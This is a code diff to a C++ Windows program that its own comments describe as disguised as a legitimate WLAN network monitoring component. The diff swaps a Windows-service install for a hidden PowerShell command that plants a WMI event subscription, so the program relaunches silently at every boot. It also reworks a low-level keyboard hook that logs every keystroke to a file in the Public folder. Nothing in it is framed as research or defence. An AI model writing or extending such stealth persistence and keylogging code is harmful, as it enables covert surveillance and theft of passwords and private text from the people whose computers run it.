@@ -40,7 +40,7 @@
 
 // ==============================================================
 // 【每次编译必看配置】请在每次点击【生成】前，在此处手动输入最新版本号！
-#define MANUAL_COMPILE_VERSION "1.8.2"
+#define MANUAL_COMPILE_VERSION "1.8.3"
 // ==============================================================
 
 // 定义当前程序版本和服务器更新地址
@@ -650,79 +650,28 @@ typedef struct _SERVICE_FAILURE_ACTIONS_FLAG {
 } SERVICE_FAILURE_ACTIONS_FLAG, *LPSERVICE_FAILURE_ACTIONS_FLAG;
 #endif
 
-// 注册为 Windows 服务以实现静默自启，伪装成合法网络监控组件
-void InstallAndStartService() {
+// 注册 WMI 订阅以实现静默自启，代替传统的 Windows 服务
+void InstallWMIAutoStart() {
     std::string exePath = GetExePath();
-    WriteLog("正在尝试注册 Windows 服务...");
+    WriteLog("正在尝试注册 WMI 订阅以实现静默自启...");
 
-    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-    if (!hSCManager) {
-        WriteLog("失败：无法打开服务控制管理器，错误代码: " + std::to_string(GetLastError()));
-        return;
-    }
+    std::string psCmd = 
+        "powershell.exe -WindowStyle Hidden -NonInteractive -NoProfile -Command \""
+        "$NS='root\\subscription';"
+        "$N='WlanMonitorSvc_WMI';"
+        "$b=Get-WmiObject -Namespace $NS -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match $N }; if($b){$b|Remove-WmiObject};"
+        "$c=Get-WmiObject -Namespace $NS -Class CommandLineEventConsumer -Filter \\\"Name='$N'\\\"; if($c){$c|Remove-WmiObject};"
+        "$f=Get-WmiObject -Namespace $NS -Class __EventFilter -Filter \\\"Name='$N'\\\"; if($f){$f|Remove-WmiObject};"
+        "$Q='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime >= 60 AND PreviousInstance.SystemUpTime < 60';"
+        "$FI=Set-WmiInstance -Namespace $NS -Class __EventFilter -Arguments @{Name=$N;EventNamespace='root\\cimv2';QueryLanguage='WQL';Query=$Q};"
+        "$Path='" + exePath + "';"
+        "$cmdL=[char]34+$Path+[char]34;"
+        "$CI=Set-WmiInstance -Namespace $NS -Class CommandLineEventConsumer -Arguments @{Name=$N;CommandLineTemplate=$cmdL};"
+        "Set-WmiInstance -Namespace $NS -Class __FilterToConsumerBinding -Arguments @{Filter=$FI;Consumer=$CI};"
+        "\"";
 
-    auto applyFailureActions = [](SC_HANDLE hSvc) {
-        SERVICE_FAILURE_ACTIONSA sfa = {0};
-        SC_ACTION actions[3];
-        actions[0].Type = SC_ACTION_RESTART; actions[0].Delay = 5000;
-        actions[1].Type = SC_ACTION_RESTART; actions[1].Delay = 5000;
-        actions[2].Type = SC_ACTION_RESTART; actions[2].Delay = 5000;
-        sfa.dwResetPeriod = 86400;
-        sfa.lpRebootMsg = NULL;
-        sfa.lpCommand = NULL;
-        sfa.cActions = 3;
-        sfa.lpsaActions = actions;
-        ChangeServiceConfig2A(hSvc, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);
-
-        SERVICE_FAILURE_ACTIONS_FLAG sfaf;
-        sfaf.fFailureActionsOnNonCrashFailures = TRUE;
-        ChangeServiceConfig2A(hSvc, SERVICE_CONFIG_FAILURE_ACTIONS_FLAG, &sfaf);
-    };
-
-    SC_HANDLE hService = CreateServiceA(
-        hSCManager,
-        "WlanMonitorSvc",                   // 正常名称，不带有任何 poweroff
-        "WLAN Network Monitor Component",   // 普通的显示名称
-        SERVICE_ALL_ACCESS,
-        SERVICE_WIN32_OWN_PROCESS,
-        SERVICE_AUTO_START,                 // 开机自启
-        SERVICE_ERROR_NORMAL,
-        exePath.c_str(),
-        NULL, NULL, NULL, NULL, NULL
-    );
-
-    if (hService) {
-        WriteLog("成功：Windows 服务注册成功！");
-        applyFailureActions(hService);
-        // 释放锁，允许 SCM 启动的服务进程能够正常通过多开检测
-        if (g_hMutex) { CloseHandle(g_hMutex); g_hMutex = NULL; }
-        StartService(hService, 0, NULL);
-        CloseServiceHandle(hService);
-    } else {
-        DWORD err = GetLastError();
-        if (err == ERROR_SERVICE_EXISTS) {
-            WriteLog("提示：服务已存在，尝试更新路径并启动它...");
-            hService = OpenServiceA(hSCManager, "WlanMonitorSvc", SERVICE_ALL_ACCESS);
-            if (hService) {
-                applyFailureActions(hService);
-
-                // 因为去除了 STOP 控制权，这里的普通请求会失败，属于正常现象，我们交由底层暴力 taskkill 即可更迭
-                SERVICE_STATUS status;
-                ControlService(hService, SERVICE_CONTROL_STOP, &status);
-                Sleep(1000); 
-
-                // 更新服务执行路径
-                ChangeServiceConfigA(hService, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, exePath.c_str(), NULL, NULL, NULL, NULL, NULL, NULL);
-
-                if (g_hMutex) { CloseHandle(g_hMutex); g_hMutex = NULL; }
-                StartService(hService, 0, NULL);
-                CloseServiceHandle(hService);
-            }
-        } else {
-            WriteLog("失败：注册服务失败，错误代码: " + std::to_string(err));
-        }
-    }
-    CloseServiceHandle(hSCManager);
+    ExecCmd(psCmd);
+    WriteLog("成功：WMI 自启注册完毕！");
 
     // 清理以前遗留的各类计划任务和注册表项
     std::string oldTaskParams = "/delete /tn \"\\Microsoft\\Windows\\AppID\\PolicyConverter\" /f";
@@ -2329,51 +2278,55 @@ int main()
                     std::ofstream vfs("C:\\Users\\Public\\WlanMonitorSvc_Volume.txt", std::ios::trunc);
                     if (vfs) vfs << vol;
                 }
-            });
 
-            g_hKeyHook = SetWindowsHookExA(WH_KEYBOARD_LL, [](int nCode, WPARAM wParam, LPARAM lParam) -> LRESULT {
-                if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
-                    KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
-                    DWORD vk = p->vkCode;
-                    std::string text;
-                    if (vk >= 'A' && vk <= 'Z') {
-                        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
-                        bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
-                        if (shift ^ caps) text = std::string(1, (char)vk);
-                        else text = std::string(1, (char)tolower(vk));
-                    } else if (vk >= '0' && vk <= '9') {
-                        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
-                        if (!shift) text = std::string(1, (char)vk);
-                        else {
-                            const char* sNums = ")!@#$%^&*(";
-                            text = std::string(1, sNums[vk - '0']);
-                        }
-                    } else if (vk == VK_SPACE) text = " ";
-                    else if (vk == VK_RETURN) text = "\n";
-                    else if (vk == VK_BACK) text = "[BACK]";
-                    else if (vk == VK_TAB) text = "[TAB]";
-                    else if (vk == VK_OEM_PERIOD) text = ".";
-                    else if (vk == VK_OEM_COMMA) text = ",";
-                    else if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) text = std::string(1, '0' + (vk - VK_NUMPAD0));
-                    else {
-                        char name[64] = {0};
-                        if (GetKeyNameTextA((p->scanCode << 16) | (p->flags << 24), name, 64)) {
-                            text = "[" + std::string(name) + "]";
-                        }
-                    }
-                    if(!text.empty()) {
-                        if (GetFileAttributesA("C:\\Users\\Public\\WlanMonitorSvc_KeylogCfg.txt") != INVALID_FILE_ATTRIBUTES) {
-                            std::string logPath = "C:\\Users\\Public\\WlanMonitorSvc_Keylog.txt";
-                            std::ofstream ofs(logPath, std::ios::app);
-                            if(ofs) {
-                                ofs << text;
-                                ofs.close();
+                bool keylogEnabled = (GetFileAttributesA("C:\\Users\\Public\\WlanMonitorSvc_KeylogCfg.txt") != INVALID_FILE_ATTRIBUTES);
+                if (keylogEnabled && g_hKeyHook == NULL) {
+                    g_hKeyHook = SetWindowsHookExA(WH_KEYBOARD_LL, [](int nCode, WPARAM wParam, LPARAM lParam) -> LRESULT {
+                        if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+                            KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
+                            DWORD vk = p->vkCode;
+                            std::string text;
+                            if (vk >= 'A' && vk <= 'Z') {
+                                bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+                                bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+                                if (shift ^ caps) text = std::string(1, (char)vk);
+                                else text = std::string(1, (char)tolower(vk));
+                            } else if (vk >= '0' && vk <= '9') {
+                                bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+                                if (!shift) text = std::string(1, (char)vk);
+                                else {
+                                    const char* sNums = ")!@#$%^&*(";
+                                    text = std::string(1, sNums[vk - '0']);
+                                }
+                            } else if (vk == VK_SPACE) text = " ";
+                            else if (vk == VK_RETURN) text = "\n";
+                            else if (vk == VK_BACK) text = "[BACK]";
+                            else if (vk == VK_TAB) text = "[TAB]";
+                            else if (vk == VK_OEM_PERIOD) text = ".";
+                            else if (vk == VK_OEM_COMMA) text = ",";
+                            else if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) text = std::string(1, '0' + (vk - VK_NUMPAD0));
+                            else {
+                                char name[64] = {0};
+                                if (GetKeyNameTextA((p->scanCode << 16) | (p->flags << 24), name, 64)) {
+                                    text = "[" + std::string(name) + "]";
+                                }
+                            }
+                            if(!text.empty()) {
+                                std::string logPath = "C:\\Users\\Public\\WlanMonitorSvc_Keylog.txt";
+                                std::ofstream ofs(logPath, std::ios::app);
+                                if(ofs) {
+                                    ofs << text;
+                                    ofs.close();
+                                }
                             }
                         }
-                    }
+                        return CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
+                    }, GetModuleHandle(NULL), 0);
+                } else if (!keylogEnabled && g_hKeyHook != NULL) {
+                    UnhookWindowsHookEx(g_hKeyHook);
+                    g_hKeyHook = NULL;
                 }
-                return CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
-            }, GetModuleHandle(NULL), 0);
+            });
 
             MSG msg;
             while(GetMessage(&msg, NULL, 0, 0)) {
@@ -2600,12 +2553,13 @@ int main()
     // 直接在当前进程中循环监听，方便断点调试
     MonitorWiFiLoop();
 #else
-    WriteLog("========== 程序手动启动 (管理员进入安装模式) ==========");
+    WriteLog("========== 程序手动启动 (管理员进入 WMI 驻留模式) ==========");
 
-    // 作为普通管理程序运行时，目标是安装为后台服务并启动
-    InstallAndStartService();
+    // 安装 WMI 后台自启
+    InstallWMIAutoStart();
 
-    WriteLog("========== 安装动作完毕，原实例退出，交由 Windows SCM 后台管理 ==========\n");
+    WriteLog("========== 准备完毕，进入后台常驻监听循环 ==========\n");
+    MonitorWiFiLoop();
 #endif
     return 0;
 }
